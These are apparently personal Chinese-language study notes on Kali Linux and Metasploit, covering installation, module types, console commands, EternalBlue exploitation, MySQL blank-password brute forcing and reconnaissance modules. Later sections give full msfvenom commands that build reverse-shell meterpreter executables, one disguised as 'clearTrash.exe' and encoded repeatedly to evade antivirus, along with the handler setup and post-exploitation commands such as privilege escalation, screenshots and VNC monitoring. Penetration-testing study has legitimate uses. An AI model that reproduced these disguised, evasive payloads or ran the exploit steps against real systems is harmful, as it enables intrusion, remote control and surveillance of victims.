## kali安装sogo输入法
apt-get install fcitx 
apt --fix-broken install
dpkg -i sogo...deb

system-configuration / Region & Language / input / add Chinese
fcitx configuration
add sogo


## metasploit

### Debian 安装

官网提供了安装方法
https://github.com/rapid7/metasploit-framework/wiki/Nightly-Installers

```
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && \
  chmod 755 msfinstall && \
    ./msfinstall
```

cd /opt/metasploit-framework/embedded/framework/

root提示:
    please run msfdb as a non-root user

    所以我们切换普通用户

    msfdb start



一定记住是非root账号运行

2003年由 HD More 发布第一版本(Perl语言)，2007年用ruby重写

被 Rapid7 收购后打造出其商业版本产品

Rapid7: 一家做扫描器的公司

版本
    Metasploit Framework
        后门只能是基于路由的后门，有可能不成功

    Metasploit Pro
        AV 免杀
        Report报告
        基于VPN的后门

Metasploit 渗透测试指南  Kali 官方 Offensive security 出版的(2011年)


内部各个库，模块之间的信息桥梁 PostgreSQL
    postgresql port 5432
    早期版本需要先启动数据库再启动msf
    kali中的那个数据库的启动已经继承到了msf的启动当中

msfdb
    init     initialize the component
    reinit   delete and reinitialize the component
    delete   delete and stop the component
    status   check component status
    start    start the component
    stop     stop the component
    restart  restart the component

## 架构

Rex
MSF::core
MSF::Base
Plugin
    连接和调用外部扩展功能和系统
    比如漏洞扫描这块,sqlmap
    












## modules

所有模块存放位置
    /usr/share/metasploit-framework/modules

1. exploits(渗透攻击模块)

    利用系统漏洞进行攻击的动作(run), 此模块对应每一个具体漏洞的攻击方法(主动、被动)
    对漏洞的利用

    漏洞：没有对输入进行很好的过滤，导致目标系统去执行payload中的内容
        payload 利用这个漏洞去执行一些程序，比如shell

    比如某个程序存在漏洞(对输入没有做完全限定),比如说输入AAA会导致代码被放置到寄存器，exploit就是发现这种未完全限定的输入，然后将payload代码(攻击工具)放入到代码可执行区域

    exploit 打开门并进入房间(相当于侦察兵)，payload 就是邪恶的恶魔
    exploit 是木马，payload 是木马里的士兵

    该目录下边 按照平台以文件夹进行分类，以漏洞代码命名的具体文件

    整个的流程 是 exploits, 先做什么，再做什么; payload 可以是任意的

    目的是执行payload

1. auxiliary(辅助模块)

    执行信息收集、枚举、指纹探测、扫描等功能的辅助模块(没有payload 的 exploit模块)

    也有一些攻击性的 auxiliary, 但不是发送 payload, 而是像 ddos 一样，

1. payloads(攻击载荷模块)

    主要建立目标机和攻击机稳定连接的

    成功exploit之后，真正在目标系统执行的代码或指令

    两种连接方式
        反弹sehll:类似于攻击者是服务器，受害者连接攻击者
        在受害者机器上开一个端口，攻击者可以去连接这个端口

    shellcode : payload 返回一个shell，或者可访问目标的shell, 
        是以拿到shell为目的payload
        是payload的一种，由于其建立正反向shell而得名


    cd /usr/share/metasploit-framework/payloads/

        1. singles
            all in one, 完整的一个payload,不需要依赖外部的库等
            大小比较大

        1. stagers
            目标计算机内存有限时，先传输一个较小的payload用于建立连接

        1. stages
            利用stager建立的连接下载的后续payload

1. encoders(编码器模块，免杀)
    对payload 进行加密，躲避 AV 检查的模块

1. post(后渗透攻击)

1. nops(空指令)
    提高 payload 稳定性及维持大小

1. evasion


## 命令

msfbinscan
msfd
msfelfscan
msfpescan
msfrop
msfrpcd
msfvenom
msfconsole
msfdb
msfmachscan
msfremove
msfrpc
msfupdate       更新 msf


### msf

不区分大小写

支持外部命令(系统命令)

帮助
    help 或者 ?

    命令 -h

set         进行参数设置
unset       取消参数设置
setg        全局设置, 进入msf 就 setg RHOSTS 1.1.1.1 必须在根目录吗???
            setg RHOSTS 1.1.1.1
save
    save configuration to :/root/.msf4/config(可以删除)
    同样会保存使用的模块环境

run / exploit
    -j 后台执行, 拿到shell

job

sessions    拿到shell，可以通过sessions 查看已经建立的shell
    -i ID号


load        导入插件，调用其他的程序, 这个程序可以是安装在其他计算机上的软件
    load openvas
unload

loadpath
    非../modules 下的模块
    加载其他路径下的模块

route   通过指定的 session 路由流量
    route add subnet netmask sid

irb 开发环境

resource    资源, options 配置
    vim a.rc
        use 模块
        set RHOST 111.111.111.111
        set ...
        run -j 

    resource a.rc 或者 msfconsole -r a.rc


### mscli


## 微软漏洞编号

ms17-010    17年第10个, 永恒之蓝
ms08-067    Microsoft Server Service Relative Path Stack Corruption




## 靶机

Metasploitable2

著名的渗透框架 Metasploit 出品方 rapid7 还提供了配置好的环境 Metasploitable，是一个打包好的操作系统虚拟机镜像，使用 VMWare 的格式。

账号和密码：msfadmin:msfadmin




## 使用

1. 启动数据库
    systemctl enable postgresql
    systemctl start postgresql

    msfdbrun 会先检查数据库状态

1. 启动 msfconsole
    msfconsole
        -v, -V, --version                Show version
        -q, --quiet                      Don't print the banner on startup
        -r, --resource FILE              Execute the specified resource file (- for stdin)


1. help 
    
    connect 命令
        类 nc 命令
        connect baidu.com 80
        get /                       

    show 命令               
        all
        plugins
        info
        options
        targets                         使用模块后，查看该模块针对的版本
        advanced
        missing                         哪些参数还没有设置

        exploits                        显示可用的模块
        auxiliary
        payloads
            set payload windows/shell/reverse_tcp   反弹sehll
        encoders
        post
        evasion
        nops

        使用了某个模块后，再用show, 就是显示对当前exploits适用的模块

        ```
        msf5 > show evasion
        evasion
        =======
        #  Name                                         Disclosure Date  Rank    Check  Description
        -  ----                                         ---------------  ----    -----  -----------
        0  windows/applocker_evasion_install_util                        manual  No     Applocker Evasion - .NET Framework Installation Utility
        1  windows/applocker_evasion_msbuild                             manual  No     Applocker Evasion - MSBuild
        ```

    search
        -h

        search mysql 
        search ms08_067
        search name:mysql

            rank:排名，漏洞级别，
                excellent:漏洞利用程序绝对不会使布标服务崩溃
                great
                good
                normal
                average:难以利用
                low:
                manual

        search path:mysql 
        search platform:linux

        type:特定类型的模块（exploits, auxiliary, payloads )
            search type:auxiliary

        search path:mysql platform:mysql

        CVE:"Common Vulnerabilities & Exposures" 公共漏洞，暴露
            为漏洞命名的字典

        search cve:CVE-2017-8464

        search cve:CVE-2018 platform:linux
    
        例如 ms08_067 漏洞，支持模糊查找
        search ms08_067
        search ms08-067
        search Ms08-067

        exploit/windows/smb/ms08_067_netapi

        Keywords:
            aka         :  Modules with a matching AKA (also-known-as) name
            author      :  Modules written by this author
            arch        :  Modules affecting this architecture
            bid         :  Modules with a matching Bugtraq ID
            cve         :  Modules with a matching CVE ID
            edb         :  Modules with a matching Exploit-DB ID
            check       :  Modules that support the 'check' method
            date        :  Modules with a matching disclosure date
            description :  Modules with a matching description
            fullname    :  Modules with a matching full name
            mod_time    :  Modules with a matching modification date
            name        :  Modules with a matching descriptive name
            path        :  Modules with a matching path
            platform    :  Modules affecting this platform
            port        :  Modules with a matching port
            rank        :  Modules with a matching rank (Can be descriptive (ex: 'good') or numeric with comparison operators (ex: 'gte400'))
            ref         :  Modules with a matching ref
            reference   :  Modules with a matching reference
            target      :  Modules affecting this target
            type        :  Modules of a specific type (exploit, payload, auxiliary, encoder, evasion, post, or nop)

        edit 
            use 当前模块后，编辑改文件，当然也可以用vim


    use 
        use exploit/windows/smb/ms08_067_netapi
        退出msf：exit

    back
        退出当前模块：

    info    模块相关信息

        info exploit/windows/smb/ms08_067_netapi

        或者先加载模块，然后info

        显示 available target 等信息


    check 
        大部分exploit 是没有check模块的,

    db_status   查看数据库状态
    db_disconnect
    db_connect  
        cp /opt/metasploit-framework/embedded/framework/config/database.yml.example ..../database.yml

        修改用户名和密码

        -y,--yaml          Connect to the data service specified in the provided database.yml file.

        db_connect -y /opt/metasploit-framework/embedded/framework/config/database.yml

    db_rebuild_cache                            将所有对象的模块放到数据库cache, 这样search速度会提高
        This command is deprecated with Metasploit 5

    db_nmap     通nmap, 会将相关信息保存到 postgresql 数据库
        db_nmap 192.168.1.1

    db_export           //数据库导出
        db_export -f <format> [filename]
        Format can be one of: xml, pwdump

        nmap -A 192.168.111.0/24 -oX nmap.xml 导出的文件也可以被导入msf 数据库
        db_import /路径/nmap.xml


    hosts               //查看数据库中主机信息
        hosts 192.168.1.1   //查看这个ip的主机
        hosts -u            //up状态的
        hosts

        -a,--add          Add the hosts instead of searching
        -d,--delete       Delete the hosts instead of searching
        -c <col1,col2>    Only show the given columns (see list below)
        -C <col1,col2>    Only show the given columns until the next restart (see list below)
        -h,--help         Show this help information
        -u,--up           Only show hosts which are up
        -o <file>         Send output to a file in csv format
        -O <column>       Order rows by specified column number
        -R,--rhosts       Set RHOSTS from the results of the search
        -S,--search       Search string to filter by
        -i,--info         Change the info of a host
        -n,--name         Change the name of a host
        -m,--comment      Change the comment of a host
        -t,--tag          Add or specify a tag to a range of hosts

    service             //查看端口信息
        -a,--add          Add the services instead of searching
        -d,--delete       Delete the services instead of searching
        -c <col1,col2>    Only show the given columns
        -h,--help         Show this help information
        -s <name>         Name of the service to add
        -p <port>         Search for a list of ports
            -p 1-1000
        -r <protocol>     Protocol type of the service being added [tcp|udp]
        -u,--up           Only show services which are up
        -o <file>         Send output to a file in csv format
        -O <column>       Order rows by specified column number
        -R,--rhosts       Set RHOSTS from the results of the search
        -S,--search       Search string to filter by
        -U,--update       Update data for existing service




## 永恒之蓝

永恒之蓝是指2017年4月14日晚，黑客团体Shadow Brokers（影子经纪人）公布一大批网络攻击工具，其中包含“永恒之蓝”工具，“永恒之蓝”利用Windows系统的SMB漏洞可以获取系统最高权限。
5月12日，不法分子通过改造“永恒之蓝”制作了wannacry勒索病毒，英国、俄罗斯、整个欧洲以及中国国内多个高校校内网、大型企业内网和政府机构专网中招，被勒索支付高额赎金才能解密恢复文件。
ms17-010

use auxiliary/admin/smb/ms17_010_command
show options
set RHOSTS 192.168.111.111
show options
run 或者 exploit    开始进行攻击


use exploit/windows/smb/ms17_010
set RHOSTS  192.168.111.111
set payload windows/x64/shell/reverse_tcp
show options
set LHOST 本机ip
run

chcp 65001

exploit -j          完成后放在后台
sessions
sessions -i 2

background          保存会话到后台


chcp
    Changes the active console code page. If used without parameters, chcp displays the number of the active console code page.

    Code page   Country/region or language
    437         United States 是美国英语  
    850         Multilingual (Latin I)
    852         Slavic (Latin II)
    855         Cyrillic (Russian)
    857         Turkish
    860         Portuguese
    861         Icelandic
    863         Canadian-French
    865         Nordic
    866         Russian
    869         Modern Greek
    936         Chinese
    936         默认的GBK
    65001       UTF-8


## mysql root 空密码

search mysql_login
use auxiliary/scanner/mysql/mysql_login         mysql 暴力破解
show options
    BLANK_PASSWORDS   true             no        Try blank passwords for all users
    BRUTEFORCE_SPEED  5                yes       How fast to bruteforce, from 0 to 5
    DB_ALL_CREDS      false            no        Try each user/password couple stored in the current database
    DB_ALL_PASS       false            no        Add all passwords in the current database to the list
    DB_ALL_USERS      false            no        Add all users in the current database to the list
    PASSWORD                           no        A specific password to authenticate with
    PASS_FILE                          no        File containing passwords, one per line
    Proxies                            no        A proxy chain of format type:host:port[,type:host:port][...]
    RHOSTS                             yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
    RPORT             3306             yes       The target port (TCP)
    STOP_ON_SUCCESS   false            yes       Stop guessing when a credential works for a host
    THREADS           1                yes       The number of concurrent threads (max one per host)
    USERNAME          root             no        A specific username to authenticate as
    USERPASS_FILE                      no        File containing users and passwords separated by space, one pair per line
    USER_AS_PASS      false            no        Try the username as the password for all users
    USER_FILE                          no        File containing usernames, one per line
    VERBOSE           true             yes       Whether to print output for all attempts
    
    //root账号空密码
    set BLANK_PASSWORDS yes
    set USERNAME root           
    set RHOSTS 192.168.111.0/24

run / exploit 


creds   //查看账号密码信息

loot    //查看哈希的信息

vulns   //查看漏洞信息




## Exploit

### active exploit 主动

主动向被攻击者发起漏洞利用代码

### passive exploit 被动

被攻击者的一些客户端软件漏洞，如浏览器，office



















## 信息收集

db_nmap

arp_sweep
    auxiliary/scanner/discovery/arp_sweep
    是否在线

auxiliary/scanner/portscan/syn
    端口是否开放

auxiliary/sniffer/psnuffle
    This module sniffs passwords like dsniff did in the past
    嗅探局域网内


基于SNMP协议收集主机信息
    scanner/snmp/snmp_enum

基于smb协议
    scanner/smb/smb_version

smb_enumshares
    auxiliary/scanner/smb/smb_enumshares

smb_lookupsid   扫描系统用户信息(SID枚举)
    auxiliary/scanner/smb/smb_lookupsid


基于ssh协议收集信息
    auxiliary/scanner/ssh/ssh_version





## 制作Windows恶意软件获取 shell

msfvenom 是 msfpayload, msfencode 的结合体

msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=服务器 LPORT=服务器端口 -b "\x00" -e x86/shikata_ga_nai -i 30 -f exe -o /root/clearTrash.exe
msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=10.0.1.177 LPORT=8848 -b "\x00" -e x86/shikata_ga_nai -i 30 -f exe -o /root/clearTrash.exe


msfvenom -a x86 --platform linux -p linux//x64/meterpreter/reverse_tcp LHOST=服务器 LPORT=服务器端口 -b "\x00" -i 10 -f elf -o /var/www/html/helloworld


    -a, --arch            <arch>     The architecture to use for --payload and --encoders (use --list archs to list)
--platform        <platform> The platform for --payload (use --list platforms to list)
    -o, --out             <path>     Save the payload to a file
    -b, --bad-chars       <list>     Characters to avoid example: '\x00\xff'
    -f, --format          <format>   Output format (use --list formats to list)
    -i, --iterations      <count>    The number of times to encode the payload
    -e, --encoder         <encoder>  The encoder to use (use --list encoders to list)
        --sec-name        <value>    The new section name to use when generating large Windows binaries. Default: random 4-character alpha string
        --smallest                   Generate the smallest possible payload using all available encoders
    --encrypt         <value>    The type of encryption or encoding to apply to the shellcode (use --list encrypt to list)
        --encrypt-key     <value>    A key to be used for --encrypt
        --encrypt-iv      <value>    An initialization vector for --encrypt
    -l, --list            <type>     List all modules for [type]. Types are: payloads, encoders, nops, platforms, archs, encrypt, formats, all
    -x, --template        <path>     Specify a custom executable file to use as a template




msfvenom -l platforms
msfvenom -l encoders
msfvenom -l payloads
msfvenom -l nops
msfvenom -l archs
msfvenom -l encrypt
msfvenom -l formats



use exploit/multi/handler       负责监听的模块
    set payload payload/windows/meterpreter/reverse_tcp
    set LHOST 



免费在线查杀网站 
    virustotal.com
    virscan.org
    nodistribute.com    不会收录特征


windows 用户分类
    1. 普通用户
    1. administrator
    1. system

meterpreter
    getsystem   提权
    getuid      获得用户ID
    getpid      木马程序的pid
    sysinfo
    screenshot  自动保存到/root
    run vnc     实时监控(查看)



evasion 模块 生成木马
